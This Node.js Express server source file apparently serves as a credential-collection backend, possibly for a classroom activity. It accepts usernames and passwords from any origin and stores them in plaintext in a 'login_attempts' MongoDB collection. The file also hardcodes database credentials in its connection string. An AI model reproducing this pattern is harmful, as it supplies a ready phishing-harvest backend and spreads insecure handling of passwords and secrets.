const express = require("express");
const cors = require("cors");
const { MongoClient } = require("mongodb");

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB connection string
const uri = "mongodb+srv://admin:1234@cluster0.dk5tb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

app.use(cors());
app.use(express.json());

app.post("/submit", async (req, res) => {
  const { username, password } = req.body;

  try {
    const client = new MongoClient(uri);
    await client.connect();
    const db = client.db("class_activity");
    const collection = db.collection("login_attempts");

    await collection.insertOne({
      username,
      password,
      timestamp: new Date()
    });

    await client.close();
    res.status(200).json({ status: "success" });
  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ status: "error", message: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
